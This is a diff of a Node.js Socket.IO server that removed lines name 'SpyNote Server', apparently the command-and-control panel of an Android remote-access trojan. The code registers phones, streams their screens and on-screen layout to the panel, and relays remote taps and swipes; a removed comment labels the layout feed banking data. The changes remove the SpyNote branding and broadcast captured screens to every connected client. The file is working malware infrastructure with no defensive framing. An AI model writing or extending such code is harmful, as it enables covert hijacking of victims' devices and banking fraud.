@@ -19,16 +19,6 @@ app.use(express.urlencoded({ limit: '100mb', extended: true }));
 
 const devices = new Map();
 
-app.post('/register', (req, res) => {
-    const { deviceId, model, brand, version, status } = req.body;
-    if (deviceId) {
-        devices.set(deviceId, { model, brand, version, status, connected: true });
-        console.log("✅ Device registered:", deviceId);
-        io.emit('devices-update', Array.from(devices.entries()));
-    }
-    res.json({ success: true });
-});
-
 app.get('/devices', (req, res) => {
     res.json(Array.from(devices.entries()));
 });
@@ -45,16 +35,17 @@ io.on('connection', (socket) => {
                 socketId: socket.id 
             });
             socket.join(deviceId);
-            console.log("📱 Device joined room:", deviceId);
+            console.log("📱 Device LIVE:", deviceId, deviceInfo.model);
             io.emit('devices-update', Array.from(devices.entries()));
         }
     });
 
-    // 🔥 SCREEN + LAYOUT STREAMING
+    // 🔥 SCREEN STREAM (BROADCAST TO ALL CLIENTS)
     socket.on('screen-frame', (data) => {
         const deviceId = data.deviceId;
-        if (devices.has(deviceId) && devices.get(deviceId).connected) {
-            socket.to(deviceId).emit('screen-update', {
+        if (devices.has(deviceId)) {
+            // Broadcast to ALL clients (not just device room)
+            socket.broadcast.emit('screen-update', {
                 deviceId,
                 data: data.data,
                 width: data.width,
@@ -64,18 +55,18 @@ io.on('connection', (socket) => {
         }
     });
 
-    // 🔥 BANKING LAYOUT DATA (TEXT + BUTTONS + SEARCHBOX)
+    // 🔥 UI LAYOUT (BROADCAST TO ALL)
     socket.on('ui-layout', (data) => {
         const deviceId = data.deviceId;
-        if (devices.has(deviceId) && devices.get(deviceId).connected) {
-            socket.to(deviceId).emit('ui-layout-update', data);
+        if (devices.has(deviceId)) {
+            socket.broadcast.emit('ui-layout-update', data);
         }
     });
 
-    // 🔥 CONTROL COMMANDS
+    // 🔥 CONTROL COMMANDS (SEND TO DEVICE ROOM)
     socket.on('control', (data) => {
-        const { deviceId, action, x, y, startX, startY, endX, endY, scrollDistance, elementText } = data;
-        if (devices.has(deviceId) && devices.get(deviceId).connected) {
+        const { deviceId, action, x, y, startX, startY, endX, endY, scrollDistance } = data;
+        if (devices.has(deviceId)) {
             socket.to(deviceId).emit('control', {
                 action,
                 x: parseFloat(x) || 0,
@@ -84,20 +75,18 @@ io.on('connection', (socket) => {
                 startY: parseFloat(startY) || 0,
                 endX: parseFloat(endX) || 0,
                 endY: parseFloat(endY) || 0,
-                scrollDistance: parseFloat(scrollDistance) || 0,
-                elementText: elementText || ""
+                scrollDistance: parseFloat(scrollDistance) || 0
             });
-            console.log('🎮 Control:', action, '→', deviceId, elementText || '');
+            console.log('🎮', action, '→', deviceId);
         }
     });
 
     socket.on('disconnect', () => {
-        console.log('🔌 Disconnected:', socket.id);
         for (const [deviceId, info] of devices.entries()) {
             if (info.socketId === socket.id) {
                 devices.set(deviceId, { ...info, connected: false });
                 io.emit('devices-update', Array.from(devices.entries()));
-                console.log('📱 Device disconnected:', deviceId);
+                console.log('📱 Device OFFLINE:', deviceId);
                 break;
             }
         }
@@ -106,6 +95,5 @@ io.on('connection', (socket) => {
 
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
-    console.log(`🚀 SpyNote Server running on port ${PORT}`);
-    console.log(`🌐 Web panel: http://localhost:${PORT}`);
+    console.log(`🚀 Server: http://localhost:${PORT}`);
 });
